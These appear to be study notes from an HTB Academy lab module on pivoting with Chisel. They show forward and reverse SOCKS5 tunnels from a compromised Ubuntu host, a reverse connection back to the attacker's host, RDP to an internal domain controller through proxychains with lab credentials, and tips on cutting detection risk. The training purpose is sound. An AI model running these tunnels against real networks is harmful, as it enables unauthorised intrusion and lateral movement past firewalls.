# Pivoting, Tunneling, and Port Forwarding — SOCKS5 Tunneling with Chisel

**Module:** HTB Academy – Pivoting, Tunneling, and Port Forwarding

---

## What is Chisel?

- **Chisel** — TCP/UDP tunneling tool written in **Go**.
- Transports data over **HTTP**, secured with **SSH**.
- Creates a **client-server tunnel** usable in firewall-restricted environments.

**Scenario:** reach a Domain Controller (`172.16.5.19`) on an internal network (`172.16.5.0/23`) not directly reachable from the attack host, via a compromised Ubuntu pivot that has an interface on that network.

---

## Setup — Standard (Forward) Chisel Tunnel

### Clone & Build

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

- Requires **Go** installed to build.
- **Note:** glibc version mismatches between target and attack host can cause build/run errors — compare versions, or use a **prebuilt release** from the GitHub Releases page instead.
- **Tip:** be mindful of binary file size when transferring to targets — both for performance and detection risk. Referenced resources: 0xdf's "Tunneling with Chisel and SSF" blog post, and IppSec's *Reddish* walkthrough (binary-shrinking starts ~24:29).

### Transfer to Pivot Host

```bash
scp chisel ubuntu@10.129.202.64:~/
```

### Start the Chisel Server (on the Pivot Host)

```bash
./chisel server -v -p 1234 --socks5
```

```
server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
server: Listening on http://0.0.0.0:1234
```

- `-p 1234` → listening port on the pivot.
- `--socks5` → serves a SOCKS5 proxy, forwarding into whatever networks the pivot host can reach (here, `172.16.5.0/23`).

### Connect the Chisel Client (on the Attack Host)

```bash
./chisel client -v 10.129.202.64:1234 socks
```

```
client: Connecting to ws://10.129.202.64:1234
client: tun: proxy#127.0.0.1:1080=>socks: Listening
client: tun: SSH connected
```

- Establishes the tunnel (HTTP transport, SSH-secured) and opens a local SOCKS listener on **port 1080**.

### Configure Proxychains

`/etc/proxychains.conf`:
```
socks5 127.0.0.1 1080
```

### Pivot to the Domain Controller

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot

- Use case: **inbound connections to the compromised host are firewall-restricted** — can't run the Chisel server there.
- Solution: run the Chisel **server on the attack host** instead, and have the **compromised host connect out** to it as the client — with `--reverse`.

### Key Concept

- Server started with `--reverse` → remotes can be prefixed with `R` to indicate reversed tunneling.
- `R:socks` → server listens on its **default SOCKS port (1080)**, and the connection terminates at the **client's** internal SOCKS5 proxy (i.e., the pivot host becomes the proxy endpoint, reachable via the server).

### Start the Chisel Server (Attack Host, Reverse Mode)

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

```
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:1234
```

### Connect the Client (Pivot Host → Attack Host)

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

```
client: Connecting to ws://10.10.14.17:1234
client: tun: SSH connected
```

- Note: the pivot host now **initiates the connection** to the attack host — works even when the pivot can't accept inbound connections.

### Configure Proxychains (Same as Before)

```
socks5 127.0.0.1 1080
```

### Pivot to the Domain Controller

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Note:** if Chisel errors out on the target, try a different version of the binary (version mismatches are a common cause of issues).

---

## Key Takeaways

| Mode | Server Runs On | Client Runs On | Use Case |
|---|---|---|---|
| **Forward** | Pivot host | Attack host | Pivot host can accept inbound connections |
| **Reverse** (`--reverse` + `R:socks`) | Attack host | Pivot host | Pivot host's inbound connections are firewall-restricted; pivot must initiate outbound instead |

- Both modes result in the same end state: a local **SOCKS5 proxy on port 1080** on the attack host, usable via **proxychains** for any tool (RDP, Nmap, etc.).
- Chisel tunnels over HTTP and secures the tunnel with SSH — useful where raw SSH or other protocols might be blocked but HTTP(S) is permitted.
- Watch for **glibc/version mismatches** when building/running on different systems — prebuilt releases are a safer fallback.
